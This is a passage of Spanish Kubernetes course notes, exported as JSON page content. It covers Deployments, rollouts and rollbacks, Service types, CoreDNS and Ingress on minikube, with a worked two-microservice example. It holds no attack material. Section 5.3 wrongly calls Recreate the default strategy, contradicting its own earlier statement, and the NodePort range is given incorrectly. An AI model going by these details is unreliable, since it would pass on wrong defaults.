Deployment que hemos indicado en la definición son:\n\nrevisionHistoryLimit: Indicamos cuántos ReplicaSets antiguos deseamos conservar, para poder realizar rollback a estados anteriores. Por defecto, es 10.\nstrategy: Indica el modo en que se realiza una actualización del Deployment. Es decir, cuando modificamos la versión de la imagen del Deployment, se crea un ReplicaSet nuevo y ¿qué hacemos con los pods?:\n\nRecreate: elimina los Pods antiguos y crea los nuevos.\nRollingUpdate: va creando los nuevos Pods, comprueba que funcionan y se eliminan los antiguos; es la opción por defecto.\n\n\n\nAdemás, hemos introducido un nuevo parámetro al definir el contenedor del pod: con el parámetro ports hemos indicado el puerto que expone el contenedor (containerPort) y le hemos asignado un nombre (name)."},"DAW/Despliegue-de-aplicaciones-web/kubernetes/5.-despliegues-deployments/5.2-gestion-basica-de-un-deployment":{"title":"5.2-gestion-basica-de-un-deployment","links":[],"tags":[],"content":"5.2 Gestión básica de un deployment\nCreación del Deployment\nCuando creamos un Deployment, se creará un ReplicaSet asociado, que creará y controlará los Pods que hayamos indicado.\nkubectl apply -f nginx-deployment.yaml\nkubectl get deploy,rs,pod\n\nPara ver los recursos que hemos creado también podemos utilizar la instrucción:\nkubectl get all\n\nEsta orden muestra los Deployments, ReplicaSets, Pods y Services que tenemos creados en el cluster. Los Services lo estudiaremos en el siguiente módulo.\n\nEscalado de los Deployments\nComo ocurría con los ReplicaSets los Deployment también se pueden escalar, aumentando o disminuyendo el número de Pods asociados. Al escalar un Deployment estamos escalando el ReplicaSet asociado en ese momento:\nkubectl scale deployment deployment-nginx --replicas=4\n\n\nOtras operaciones\nSi queremos acceder a la aplicación, podemos utilizar la opción de port-forward sobre el despliegue (de nuevo recordamos que no es la forma adecuada para acceder a un servicio que se ejecuta en un Pod, pero de momento no tenemos otra). En este caso si tenemos asociados más de un Pod, la redirección de puertos se hará sobre un solo Pod (no habrá balanceo de carga):\nkubectl port-forward deployment/deployment-nginx 8080:80\n\nSi queremos ver los logs generados en los Pods de un Deployment:\nkubectl logs deployment/deployment-nginx\n\nSi queremos obtener información detallada del recurso Deployment que hemos creado:\nkubectl describe deployment deployment-nginx\n\n\nEliminando el Deployment\nSi eliminamos el Deployment se eliminarán el ReplicaSet asociado y los Pods que se estaban gestionando.\nkubectl delete deployment deployment-nginx\n"},"DAW/Despliegue-de-aplicaciones-web/kubernetes/5.-despliegues-deployments/5.3-actualizacion-y-desactualizacion-de-un-deployment":{"title":"5.3-actualizacion-y-desactualizacion-de-un-deployment","links":[],"tags":[],"content":"5.3 Actualización y desactualización de un deployment\nCiclo de vida del desarrollo de aplicaciones…\nEl ciclo de vida del desarrollo de aplicaciones cuando trabajamos con contenedores nos facilita la labor de versionar nuestros desarrollos. Por cada nueva versión que se desarrolla de nuestra aplicación podemos crear una nueva imagen del contenedor que podemos versionar utilizando la etiqueta del nombre de la imagen.\nPor lo tanto, al crear un Deployment indicaremos la imagen desde la que se van a crear los Pods. Al indicar la imagen podremos indicar la etiqueta que nos indica la versión de la aplicación que vamos a implantar.\nUna vez que hemos creado un Deployment a partir de una imagen de una versión determinada, tenemos los Pods ejecutando la versión indicada de la aplicación.\n¿Cómo podemos actualizar a una nueva versión de la aplicación?. Se seguirán los siguientes pasos:\n\nTendremos que modificar el valor del parámetro image para indicar una nueva imagen, especificando la nueva versión mediante el cambio de etiqueta.\nEn ese momento el Deployment se actualiza, es decir, crea un nuevo ReplicaSet que creará nuevos Pods de la nueva versión de la aplicación.\nSegún la estrategia de despliegue indicada, se irán borrando los antiguos Pods y se crearán lo nuevos.\nEl Deployment guardará el ReplicaSet antiguo, por si en algún momento queremos volver a la versión anterior.\n\nVeamos este proceso con más detalles estudiando un ejemplo de despliegue:\nDesplegando la aplicación mediawiki\nVamos a partir del fichero mediawiki-deployment.yamlpara desplegar la aplicación:\napiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: mediawiki\n  labels:\n    app: mediawiki\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: mediawiki\n  template:\n    metadata:\n      labels:\n        app: mediawiki\n    spec:\n      containers:\n      - name: contenedor-mediawiki\n        image: mediawiki:1.38.5\n        ports:\n        - containerPort: 80\n\nSi nos fijamos vamos a desplegar la versión 1.38.5 de la aplicación mediawiki. Creamos el despliegue con la siguiente instrucción:\nkubectl apply -f mediawiki-deployment.yaml\n\nA continuación podemos “anotar” en el despliegue la causa del nuevo despliegue, de esta forma al visualizar el historial de modificaciones veremos las causas que han provocado cada actualización. Para ello:\nkubectl annotate deployment/mediawiki kubernetes.io/change-cause=&quot;Primer despliegue. Desplegamos versión 1.38.5&quot;\n\nPodemos comprobar los recursos que hemos creado:\nkubectl get all\n\nY si accedemos al Pod con un port-forward comprobamos que la versión actual de la mediawiki es la 1.38.5:\nkubectl port-forward deployment/mediawiki 8080:80\n\n\n\nActualizar un Deployment\nA continuación queremos desplegar una versión más reciente de la mediawiki. Para ello tenemos que modificar el campo image de nuestro Deployment, esta operación la podemos hacer de varias formas:\n\n\nModificando el fichero yaml y volviendo a ejecutar un kubectl apply.\n\n\nEjecutando la siguiente instrucción:\n kubectl set image deployment/mediawiki contenedor-mediawiki=mediawiki:1.39.1\n\n\n\nAl ejecutar la actualización del Deployment podemos observar que se ha creado un nuevo ReplicaSet, que creará los nuevos Pods a partir de la versión modificada de la imagen. ¿Cómo se crean los nuevos Pods y se destruyen los antiguos? Dependerá de la estrategia de despliegue:\n\nPor defecto la estrategia de despliegue es Recreate que elimina los Pods antiguos y crea los nuevos.\nSi indicamos en el despliegue el tipo de estrategia RollingUpdate, se van creando los nuevos Pods, se comprueba que funcionan y se eliminan los antiguos.\n\nA continuación indicamos el motivo del cambio del despliegue con una anotación:\nkubectl annotate deployment/mediawiki kubernetes.io/change-cause=&quot;Segundo despliegue. Actualizamos a la versión 1.39.1&quot;\n\nVeamos los recursos que se han creado en la actualización:\nkubectl get all\n\nKubernetes utiliza el término rollout para la gestión de diferentes versiones de despliegues. Podemos ver el historial de actualizaciones que hemos hecho sobre el despliegue:\nkubectl rollout history deployment/mediawiki\n\nY nos aparecen las anotaciones que hemos hecho de cada despliegue:\ndeployment.apps/mediawiki\nREVISION  CHANGE-CAUSE\n1         Primer despliegue. Desplegamos versión 1.38.5\n2         Segundo despliegue. Actualizamos a la versión 1.39.1\n\nY volvemos a acceder a la aplicación con un port-forward para comprobar que realmente se ha desplegado la versión 1.39.1.\n\n\nRollback del Deployment\nEl proceso de despliegue de una nueva versión de una aplicación es una labor crítica, que tradicionalmente ha dado muchos problemas. Si estamos sirviendo una aplicación web que utilizan muchos usuarios, no nos podemos permitir que haya un corte en el servicio por un problema en el despliegue de una nueva versión.\nEvidentemente, los problemas que pueden aparecer durante el despliegue de una nueva versión pueden estar causados por muchos motivos, y muchas veces es complicado tener todos los factores controlados. Si finalmente tenemos alguno, la pregunta sería: ¿Hemos diseñado un proceso que nos permita de una manera sencilla y rápida volver a la versión anterior de la aplicación que sabíamos que funcionaba bien?\nA ese proceso de volver a una versión anterior de la aplicación es lo que llamamos rollback, o de forma concreta en k8s, “deshacer” un rollout. Veremos en este ejemplo que Kubernetes nos ofrece un mecanismo sencillo de volver a versiones anteriores. Como hemos comentado, las actualizaciones de los Deployment van creando nuevos ReplicaSet, y se va guardando el historial de ReplicaSet anteriores. Deshacer un Rollout será tan sencillo como activar uno de los ReplicaSet antiguos.\nAhora vamos a desplegar una versión que nos da un error (la versión 2 de la aplicación no existe, no existe la imagen mediawiki:2). ¿Podremos volver al despliegue anterior?\nkubectl set image deployment mediawiki contenedor-mediawiki=mediawiki:2\n\nY realizamos la anotación:\nkubectl annotate deployment/mediawiki kubernetes.io/change-cause=&quot;Tercer despliegue. Actualizamos a la versión 2&quot;\n\nComprobamos el historial de despliegues:\nkubectl rollout history deployment/mediawiki\ndeployment.apps/mediawiki\nREVISION  CHANGE-CAUSE\n1         Primer despliegue. Desplegamos versión 1.38.5\n2         Segundo despliegue. Actualizamos a la versión 1.39.1\n3         Tercer despliegue. Actualizamos a la versión 2\n\nDependiendo de la estrategia de despliegue, esto puede provocar que la aplicación se quede en la versión anterior (RollingUpdate) o que no haya ningún Pod válido desplegado (Recreate). En cualquier caso, se puede volver a la versión anterior del despliegue mediante rollout:\nkubectl rollout undo deployment/mediawiki\nkubectl get all\n\nY terminamos comprobando el historial de actualizaciones:\nkubectl rollout history deployment mediawiki\ndeployment.apps/mediawiki\nREVISION  CHANGE-CAUSE\n1         Primer despliegue. Desplegamos versión 1.38.5\n3         Tercer despliegue. Actualizamos a la versión 2\n4         Segundo despliegue. Actualizamos a la versión 1.39.1\n"},"DAW/Despliegue-de-aplicaciones-web/kubernetes/6.-acceso-a-las-aplicaciones-services/6.0-acceso-a-las-aplicaciones":{"title":"6.0-acceso-a-las-aplicaciones","links":[],"tags":[],"content":"6. Acceso a las aplicaciones (Services)\nLos servicios (Services) nos permiten acceder a las aplicaciones que hemos desplegado en el cluster.\n\nUn Service es una abstracción que nos permite acceder a un conjunto de pods (que se han creado a partir de un Deployment) que implementan una aplicación (Por ejemplo: acceder a un servidor web, a una servidor de base de datos, a un servicio que forma parte de una aplicación, …).\nA cada Pod se le asigna una IP a la que no se puede acceder directamente, por lo tanto necesitamos un Service que nos ofrece una dirección virtual (CLUSTER-IP) y un nombre que identifica al conjunto de Pods que representa, al cual nos podemos conectar.\nLa conexión al Service se puede realizar desde otros Pods o desde el exterior (mediante la generación aleatoria de un puerto). Por ejemplo, si tenemos una aplicación formada por dos Services: servidor web y servidor de base de datos, tendremos que acceder desde el exterior al servidor web, y acceder al servidor de base de datos desde el servidor web. En principio no será necesario acceder al servidor de base de datos desde el exterior.\nSi el Deployment que hemos creado tiene más de un Pod asociado, el Service que representa el acceso a esta aplicación balanceará la carga entre los Pods con una política Round Robin.\nEn el cluster existirá un componente que nos ofrece un servicio DNS. Cada vez que creamos un Service se actualizará el DNS para resolver el nombre que hemos asignado al Service con la IP virtual (CLUSTER-IP) que se le ha asignado.\nNota Cuando tenemos más de un Pod ofreciendo el mismo servicio, realmente tenemos un clúster y es importante distinguir entre servicios sin estado (stateless) o con estado (stateful)). En un servicio sin estado (por ejemplo, un servidor web que sirva contenido estático), las peticiones son independientes y se pueden servir por diferentes nodos sin problema, aunque en el caso de un servidor web, deberíamos asegurarnos previamente de que el directorio con los datos es el mismo. Un servicio de este tipo lo podemos escalar con un despliegue sin problema. Por otra parte, si el servicio tiene estado (por ejemplo, un servidor de bases de datos), una petición puede depender de otra anterior, por lo que puede haber incoherencias si simplemente creamos un cluster de nodos iguales. En este tipo de servicios, es necesaria una configuración adicional que controle el estado y que haga que los datos que sirve cada Pod son coherentes entre sí. Veremos un ejemplo de este tipo de servicios en el módulo 9 del curso.\n\nTipos de Services\nClusterIP\nSolo se permite el acceso interno a un Service de este tipo. Es decir, si tenemos un despliegue con una aplicación a la que no es necesario acceder desde el exterior, crearemos un Service de este tipo para que otras aplicaciones puedan acceder a ella (por ejemplo, una base de datos). Es el tipo por defecto. Si deseamos seguir accediendo desde el exterior, para hacer pruebas durante la fase de desarrollo podemos seguir utilizando la instrucción kubectl port-forward.\n\nVeamos el ejemplo:\n\nNecesitamos que los Pods de Wordpress accedan al Pod del MySQL.\nLa IP que ha tomado el Pod de MySQL (172.25.3.5) es inaccesible desde los Pods de Wordpress.\nPor lo tanto hemos creado un Service de tipo ClusterIP, que ha obtenido una ip virtual (192.168.3.5) y expone el puerto de MySQL 3306.\nEsta IP sí es accesible desde los Pods de Wordpress.\nAl acceder a esta IP se balanceará la carga entre los Pods de MySQL (en el ejemplo sólo tenemos uno).\nAdemás en el Wordpress no necesitamos configurar la IP virtual del Service que hemos creado, ya que disponemos de un servidor DNS que resuelve el nombre del Service mysql en la dirección virtual del Service (192.168.3.5). Por lo tanto en la configuración de Wordpress pondremos el nombre mysql como host del servidor de base de datos al que debe acceder.\n\nNodePort\nAbre un puerto, para que el Service sea accesible desde el exterior. Por defecto el puerto generado está en el rango de 30000:40000. Para acceder usamos la ip del servidor master del cluster y el puerto asignado.\n\nVeamos el ejemplo:\n\nNecesitamos que los Pods de Wordpress sean accesibles desde el exterior, para que podamos acceder a la aplicación.\nLa IP que han tomado los Pods de Wordpress (172.25.3.3, …) no son accesibles desde el exterior. Además comprobamos que estos Pods están ofreciendo el servicio en el puerto 8080.\nPor lo tanto, hemos creado un Service de tipo NodePort que ha obtenido una IP virtual (192.168.3.4) y expone el puerto 80.\nAl acceder a esta IP al puerto 80 se balanceará la carga entre los Pods de Wordpress, accediendo a las IPs de los Pods de Wordpress al puerto 8080.\nEl Service NodePort ha asignado un puerto de acceso aleatorio (entre el 30000 - 40000) que nos permite acceder a la aplicación mediante la IP del nodo master. En el ejemplo si accedemos a 10.0.2.4:30453 estaremos accediendo al Service que nos permitirá acceder a la aplicación.\n\nLoadBalancer\nEste tipo sólo está soportado en servicios de cloud público (GKE, AKS o AWS). El proveedor asignará un recurso de balanceo de carga para el acceso a los Services. Si usamos un cloud privado como OpenStack, necesitaremos un plugin para configurar el funcionamiento. Este tipo de Service no lo vamos a utilizar en el presente curso.\n\nComo vemos en el ejemplo, el cloud de infraestructura donde tengamos instalado el cluster nos ofrecerá un recurso balanceador de carga con una IP accesible desde el exterior que nos permitirá acceder a la aplicación directamente."},"DAW/Despliegue-de-aplicaciones-web/kubernetes/6.-acceso-a-las-aplicaciones-services/6.1-describiendo-services":{"title":"6.1-describiendo-services","links":[],"tags":[],"content":"6.1 Describiendo services\nServices NodePort\nSuponemos que tenemos desplegado nginx usando el fichero yaml: nginx-deployment.yaml:\nkubectl apply -f nginx-deployment.yaml\n\nPor lo tanto tenemos dos Pods ofreciendo el servidor web nginx, a los que queremos acceder desde el exterior y que se balancee la carga entre ellos.\nAunque podríamos crear un recurso Service desde la línea de comandos:\nkubectl expose deployment/nginx --port=80 --type=NodePort\n\nNormalmente lo que hacemos es describir las características del Service en un fichero yaml nginx-srv.yaml:\napiVersion: v1\nkind: Service\nmetadata:\n  name: nginx\nspec:\n  type: NodePort\n  ports:\n  - name: service-http\n    port: 80\n    targetPort: http\n  selector:\n    app: nginx\n\nVeamos la descripción:\n\nVamos a crear un recurso Service (parámetro kind) y lo nombramos como nginx (parámetro name). Este nombre será importante para la resolución dns.\nEn la especificación del recurso indicamos el tipo de Service (parámetro type).\nA continuación, definimos el puerto por el que va a ofrecer el Service y lo nombramos (dentro del apartado port: el parámetro port y el parámetro name). Además, debemos indicar el puerto en el que los Pods están ofreciendo el Service (parámetro targetPort), en este caso, hemos usado el nombre del puerto (http) que indicamos en el recurso Deployment:\n\n   ...\n   ports:\n    - name: http\n      containerPort: 80\n   ...\n\n\nPor ultimo, seleccionamos los Pods a los que vamos acceder y vamos a balancear la carga seleccionando los Pods por medio de sus etiquetas (parámetro selector).\n"},"DAW/Despliegue-de-aplicaciones-web/kubernetes/6.-acceso-a-las-aplicaciones-services/6.2-gestionando-los-services":{"title":"6.2-gestionando-los-services","links":[],"tags":[],"content":"6.2 Gestionando los services\nService de tipo NodePort\nPara aprender cómo gestionamos los Services, vamos a trabajar con el Deployment de nginx (nginx-deployment.yaml) y el Service NodePort (nginx-srv.yaml) para acceder a los Pods de este despliegue desde el exterior.\nCreamos el Deployment\nEl primer paso sería crear el Deployment de nginx:\nkubectl apply -f nginx-deployment.yaml\n\nCreamos el Service\nA continuación vamos a crear el Service de tipo NodePort que nos permitirá acceder al servidor nginx.\nkubectl apply -f nginx-srv.yaml\n\nPara ver los Services que tenemos creado:\nkubectl get services\n\nRecuerda que si usamos kubectl get all también se mostrarán los Services.\nAntes de acceder a la aplicación podemos ver la información más detallada del Service que acabamos de crear:\nkubectl describe service/nginx\nName:                     nginx\n...\nSelector:                 app=nginx\nType:                     NodePort\n...\nIP:                       10.110.81.74\nPort:                     service-http  80/TCP\nTargetPort:               http/TCP\nNodePort:                 service-http  32717/TCP\nEndpoints:                172.17.0.3:80,172.17.0.4:80\n...\n\nPodemos ver la etiqueta de los Pods a los que accede (Selector). El tipo de Service (Type). La IP virtual que ha tomado (CLUSTER-IP) y que es accesible desde el cluster (IP). El puerto por el que ofrece el Service (Port). El puerto de los Pods a los que redirige el tráfico (TargetPort). Al ser un service de tipo NodePort nos da información del puerto que se asignado para acceder a la aplicación (NodePort). Y por último, podemos ver las IPs de los Pods que ha seleccionado y sobre los que balanceará la carga (Endpoints).\nAccediendo a la aplicación\nVemos el Service que hemos creado:\nkubectl get services\n...\nnginx        NodePort    10.110.81.74   &lt;none&gt;        80:32717/TCP   32s\n\nObservamos que se ha asignado el puerto 32717 para el acceso, por lo tanto si desde un navegador accedemos a la IP del nodo master y a este puerto podremos ver la aplicación.\n¿Cómo sé la dirección ip del nodo master del cluster minikube? Podemos ejecutar:\nminikube ip\n192.168.39.222\n\nY ya podemos acceder desde un navegador web:\n\nService ClusterIP\nEn esta ocasión vamos a desplegar una base de datos MariaDB. En este caso no vamos a necesitar acceder a la base de datos desde el exterior, pero necesitamos que los Pods de otro despliegue puedan acceder a ella. Por lo tanto vamos a crear un Service de tipo ClusterIP.\nPara el despliegue de MariaDB vamos a usar el fichero mariadb-deployment.yaml. Puedes comprobar que en la definición del contenedor hemos añadido la sección env que nos permite establecer variables de entorno para configurar el contenedor (los estudiaremos en el siguiente módulo).\nPara la creación del Service utilizamos el fichero mariadb-srv.yaml.\nPara la creación del Deployment y el Service vamos ejecutando las siguientes instrucciones:\nkubectl apply -f mariadb-deployment.yaml\nkubectl apply -f mariadb-srv.yaml\n\nComprobamos el Service creado:\nkubectl get services\nmariadb      ClusterIP   10.106.60.233   &lt;none&gt;        3306/TCP       2m22s\n\nkubectl describe service/mariadb\nName:              mariadb\n...\nSelector:          app=mariadb\nType:              ClusterIP\n...\nIP:                10.106.60.233\nPort:              service-bd  3306/TCP\nTargetPort:        db-port/TCP\nEndpoints:         172.17.0.5:3306\n...\n\nPodemos comprobar que no se ha mapeado un puerto aleatorio para que accedamos usando la IP del nodo master. Los Pods que accedan a la IP 10.106.60.233 o al nombre mariadb y al puerto 3306 estarán accediendo al Pod (172.17.0.5:3306) del despliegue de mariadb.\nEliminando los servicios\nPor ejemplo para borrar el servicio mariadb, ejecutaríamos:\nkubectl delete service mariadb\n"},"DAW/Despliegue-de-aplicaciones-web/kubernetes/6.-acceso-a-las-aplicaciones-services/6.3-servicio-dns-en-kubernetes":{"title":"6.3-servicio-dns-en-kubernetes","links":[],"tags":[],"content":"6.3 Servicio DNS en Kubernetes\nExiste un componente de Kubernetes llamado CoreDNS, que ofrece un servidor DNS interno para que los Pods puedan resolver diferentes nombres de recursos (Services, Pods, …) a direcciones IP.\nCada vez que se crea un nuevo recurso Service se crea un registro de tipo A con el nombre:\n&lt;nombre_servicio&gt;.&lt;nombre_namespace&gt;.svc.cluster.local.\n\nComprobemos el servidor DNS\nPartimos del punto anterior donde tenemos creados los dos Services:\nkubectl get services\nmariadb      ClusterIP   10.106.60.233   &lt;none&gt;        3306/TCP\nnginx        NodePort    10.110.81.74    &lt;none&gt;        80:32717/TCP\n\nPara comprobar el servidor DNS de nuestro cluster y que podemos resolver los nombres de los distintos Services, vamos a usar un Pod (busybox.yaml) creado desde una imagen busybox. Es una imagen muy pequeña pero con algunas utilidades que nos vienen muy bien:\nkubectl apply -f busybox.yaml\n\n¿Qué servidor DNS está configurado en los Pods que estamos creando? Podemos ejecutar la siguiente instrucción para comprobarlo:\nkubectl exec -it busybox -- cat /etc/resolv.conf\nnameserver 10.96.0.10\nsearch default.svc.cluster.local svc.cluster.local cluster.local\n\n\nEl servidor DNS (componente coreDNS) tiene asignado la IP del cluster 10.96.0.10.\nPodemos utilizar el nombre corto del Service, porque buscará el nombre del host totalmente cualificado usando los dominios indicados en el parámetro search. Como vemos el primer nombre de dominio es el que se crea con los Services: default.svc.cluster.local (recuerda que el namespace que estamos usando es default).\n\nVamos a comprobar que realmente se han creado dos registros A para cada uno de los Service, haciendo consultas DNS:\nkubectl exec -it busybox -- nslookup nginx\nServer:\t\t10.96.0.10\nAddress:\t10.96.0.10:53\n\nName:\tnginx.default.svc.cluster.local\nAddress: 10.110.81.74\n\nVemos que ha hecho la resolución del nombre nginx con la IP correspondiente a su servicio. Y con el Service mariadb también lo podemos hacer:\nkubectl exec -it busybox -- nslookup mariadb\nServer:\t\t10.96.0.10\nAddress:\t10.96.0.10:53\n\nName:\tmariadb.default.svc.cluster.local\nAddress: 10.106.60.233\n\nTambién podemos comprobar que usando el nombre podemos acceder al servicio:\nkubectl exec -it busybox -- wget http://nginx\nConnecting to nginx (10.110.81.74:80)\nsaving to &#039;index.html&#039;\n...\n\nPodemos concluir que, cuando necesitemos acceder desde alguna aplicación desplegada en nuestro cluster a otro servicio ofrecido por otro despliegue, utilizaremos el nombre que hemos asignado a su Service de acceso. Por ejemplo, si desplegamos un Wordpress y un servidor de base de datos mariadb, y creamos dos Services: uno de tipo NodePort para acceder desde el exterior al CMS, y otro, que llamamos mariadb de tipo ClusterIP para acceder ala base de datos, cuando tengamos que configurar el Wordpress para indicar la dirección de la base de datos, pondremos mariadb."},"DAW/Despliegue-de-aplicaciones-web/kubernetes/6.-acceso-a-las-aplicaciones-services/6.4-ingress-controller":{"title":"6.4-ingress-controller","links":[],"tags":[],"content":"6.4 Ingress Controller\nHasta ahora tenemos dos opciones principales para acceder a nuestras aplicaciones desde el exterior:\n\nUtilizando Services del tipo NodePort: Esta opción no es muy viable para entornos de producción ya que tenemos que utilizar puertos aleatorios desde 30000-40000.\nUtilizando Services del tipo LoadBalancer: Esta opción sólo es válida si trabajamos en un proveedor Cloud que nos ofrece un balanceador de carga para cada una de las aplicaciones, en cloud público puede ser una opción muy cara.\n\nLa solución puede ser utilizar un Ingress controller que nos permite utilizar un proxy inverso (HAproxy, nginx, traefik,…) que por medio de reglas de encaminamiento que obtiene de la API de Kubernetes, nos permite el acceso a nuestras aplicaciones por medio de nombres.\nInstalación de Ingress Controller en minikube\nCuando hacemos una instalación de minikube el componente de Ingress Controller no viene instalada por defecto. minikube nos ofrece un conjunto de addons que al activarlos nos instalan un determinado componente que nos ofrece una funcionalidad adicional. Para ver los addons que nos ofrece minikube podemos ejecutar:\nminikube addons list\n\nPara activar el Ingress Controller ejecutamos:\nminikube addons enable ingress\n\nPara comprobar si tenemos instalado el componente, podemos visualizar los Pods creados en el namespace ingress-nginx. Este espacio de nombre se ha creado para desplegar el controlador de ingress Por lo tanto al ejecutar:\nkubectl get pods -n ingress-nginx\n...\ningress-nginx-controller-558664778f-shjzp   1/1     Running     0\n...\n\nDebe aparece un Pod que se llama ingress-nginx-controller-..., si es así, significa que se ha instalado un Ingress Controller basado en el proxy inverso nginx.\n\nDescribiendo el recurso Ingress\nUna vez instalado el componente Ingress Controller, ya podemos definir un recurso Ingress en un fichero yaml. Para ello vamos a trabajar con el despliegue y el Service que hemos creado de nginx.\nEl recurso Ingress para acceder a nuestro despliegue de nginx lo tenemos en el fichero ingress.yaml:\napiVersion: networking.k8s.io/v1\nkind: Ingress\nmetadata:\n  name: nginx\nspec:\n  rules:\n  - host: www.example.org\n    http:\n      paths:\n      - path: /\n        pathType: Prefix\n        backend:\n          service:\n            name: nginx\n            port:\n              number: 80\n\nHemos indicado el tipo de recurso Ingress (kind) y le hemos puesto un nombre (name). A continuación en la especificación del recurso vamos a poner una regla que relaciona un nombre de host con un Service que me permita el acceso a una aplicación:\n\nhost: Indicamos el nombre de host que vamos a usar para el acceso. Este nombre debe apuntar a la ip del nodo master.\npath: Indicamos el path de la url que vamos a usar, en este caso sería la ruta raíz: /. Esto nos sirve por si queremos servir la aplicación en una ruta determinada, por ejemplo: www.example.org/app1.\npathType: No es importante, nos permite indicar cómo se van a trabajar con las URL.\nbackend: Indicamos el Service al que vamos a acceder. En este caso indicamos el nombre del Service (service/name) y el puerto del Service (service/port/number).\n\nCuando se crea el recurso, y accedamos al nombre indicado, un proxy inverso redirigirá las peticiones HTTP a la IP y al puerto del Service correspondiente. Nota: Utilizando Ingress no es necesario que los Services sean de tipo NodePort para acceder a la aplicación desde el exterior.\nGestionando el recurso Ingress\nPara crear el recurso Ingress:\nkubectl apply -f ingress.yaml\n\nY podemos ver el recurso Ingress que hemos creado:\nkubectl get ingress\n\nY obtener información detallada del recurso con:\nkubectl describe ingress/nginx\n\n\nAccediendo a la aplicación\nComo no tenemos un servidor DNS que nos permita gestionar los nombres que vamos a utilizar para el acceso a las aplicaciones, vamos a usar resolución estática. Para ello como root añadimos una nueva línea en el fichero /etc/hosts, indicando el nombre (www.example.org) y la ip a la que corresponde, la ip del nodo master:\n192.168.39.222  www.example.org\n\nY ya podemos acceder a la aplicación usando el nombre:\n"},"DAW/Despliegue-de-aplicaciones-web/kubernetes/6.-acceso-a-las-aplicaciones-services/6.5-ejemplo-completo-aplicacion-de-temperaturas":{"title":"6.5-ejemplo-completo-aplicacion-de-temperaturas","links":[],"tags":[],"content":"6.5 Ejemplo completo: aplicación de temperaturas\nVamos a hacer un despliegue completo de una aplicación llamada Temperaturas. Esta aplicación nos permite consultar la temperatura mínima y máxima de todos los municipios de España y estará formada por dos microservicios:\n\nfrontend: Es una aplicación escrita en Python que nos ofrece una página web para hacer las búsquedas y visualizar los resultados. Este microservicio hará peticiones HTTP al segundo microservicio para obtener la información.\nbackend: Es el segundo microservicio que nos ofrece un servicio web de tipo API Restful. A esta API Web podemos hacerles consultas sobre los municipios y sobre las temperaturas.\n\nAlgunas consideraciones sobre el despliegue que vamos a realizar:\n\nComo la aplicación está formada por dos microservicios, tendremos que crear dos recursos Deployment para desplegar y controlar los Pods de cada despliegue por separado.\nNecesitaremos acceder desde el exterior al microservicio frontend por lo que crearemos un recurso Service de tipo NodePort.\nAl componente backend no es necesario acceder desde el exterior, por lo tanto crearemos un recurso Service de tipo ClusterIP para permitir que se acceda desde frontend.\nPara terminar usaremos un recurso Ingress para acceder al componente frontend por lo tanto, en ese momento, no es necesario que el Service para acceder a ese componente sea de tipo NodePort, bastaría con que fuera ClusterIP.\n\n\nDespliegue y acceso al microservicio frontend\nEn primer lugar vamos a desplegar el primer microservicio. Esta aplicación está usando el puerto 3000/tcp para ofrecer la aplicación. Para describir el despliegue utilizaremos el fichero frontend-deployment.yaml y para crear el despliegue ejecutaremos la siguiente instrucción:\nkubectl apply -f frontend-deployment.yaml\n\nA continuación usamos el fichero frontend-srv.yaml para crear el Service NodePort:\nkubectl apply -f frontend-srv.yaml\n\nObtenemos los recursos que hemos creado. Nos fijamos en el puerto que nos ha asignado por el Service NodePort (en mi caso el 30053). Vamos a acceder desde un navegador web usando la ip del nodo master y el puerto que nos han asignado:\n\nComo podemos observar la aplicación nos muestra un mensaje de error: “No puedo conectar con el servidor de temperaturas…. Evidentemente el componente frontend está intentando conectar con el componente backend y, evidentemente, no puede, ya que ni la hemos desplegado, ni hemos creado el Service correspondiente.\n\nDespliegue y acceso al microservicio backend\nEs el momento de desplegar el segundo microservicio. Este microservicio ofrece un servicio API Restful en el puerto 5000/tcp. Para ello utilizaremos el fichero backend-deployment.yaml para realizar el despliegue y el fichero backend-srv.yaml para crear el Service.\nkubectl apply -f backend-deployment.yaml\nkubectl apply -f backend-srv.yaml\n\nSi volvemos acceder al navegador y refrescamos la página, veremos que ya no nos sale el mensaje de error y podemos buscar la temperatura de nuestra ciudad:\n\nNota: Por defecto el componente frontend hace peticiones al componente backend utilizando el nombre temperaturas-backend, que es el nombre que hemos asignado al Service ClusterIP para el acceso al backend. En el próximo módulo veremos como podemos cambiar la configuración de frontend para cambiar el nombre del servicio web al que conecta.\n\nAlgunas consideraciones acerca del despliegue que hemos realizado\nEsta manera de trabajar donde cada microservicio que forma parte de la aplicación (o si tenemos una aplicación que necesite varios servicios (servidor web, servidor de base de datos,…)) se despliega de forma separada usando distintos recursos Deployment nos proporciona las siguientes características:\n\nCada conjunto de Pods creado en cada despliegue ejecutará un solo proceso para ofrecer un servicio o microservicio.\nCada conjunto de Pods se puede escalar de manera independiente. Esto es importante ya que si identificamos que al acceder a alguno de los servicios se crea un cuello de botella, podemos escalarlo para tener más Pods ejecutando el servicio. En el ejemplo que hemos desarrollado, se crearon 3 Pods del frontend y un Pod del backend, pero se pueden escalar independientemente los dos despliegues. Te invito a escalar los dos despliegues y comprobar que sigue funcionando la aplicación.\nLas actualizaciones de los distintos servicios / microservicios no interfieren en el resto.\nLo estudiaremos en un módulo posterior, pero podremos gestionar el almacenamiento de cada servicio de forma independiente.\nYa lo hemos comentado, pero con esta aplicación podemos observar el balanceo de carga que realiza el Service al acceder al frontend: la aplicación visualiza el nombre del servidor que está ofreciendo la página. Por lo tanto si vamos refrescando la página con F5 observaremos cómo se va realizando el balanceo de carga y va cambiando el nombre del Pod al que está accediendo.\n\n\nAcceso a la aplicación usando el Ingress Controller\nPara terminar vamos a crear un recurso Ingress que nos posibilite acceder a la aplicación utilizando un nombre. Como hemos indicado al utilizar Ingress no es necesario que el Service al que accede sea de tipo NodePort, por lo tanto lo primero que vamos a hacer es cambiar el tipo de Service que accede a frontend y lo vamos a poner ClusterIP, para ello vamos a modificar el fichero frontend-srv.yaml cambiando el tipo de Service de NodePort a ClusterIP, y posteriormente aplicamos los cambios:\nkubectl apply -f frontend-srv.yaml\n\nComprobamos que realmente ha cambiado el tipo de Service, y que ya no tenemos un puerto para acceder usando la ip del nodo master.\nA continuación usamos el fichero ingress.yaml para crear el recurso Ingress, que definirá el nombre del host www.temperaturas.org que tendremos que introducir en la resolución estática tay como hemos visto anteriormente. Por lo tanto modificamos el fichero /etc/hosts de nuestro ordenador con la siguiente línea:\n192.168.39.222  www.temperaturas.org\n\nCreamos el recurso Ingress:\nkubectl apply -f ingress.yaml\n\nY accedemos a la aplicación usando el 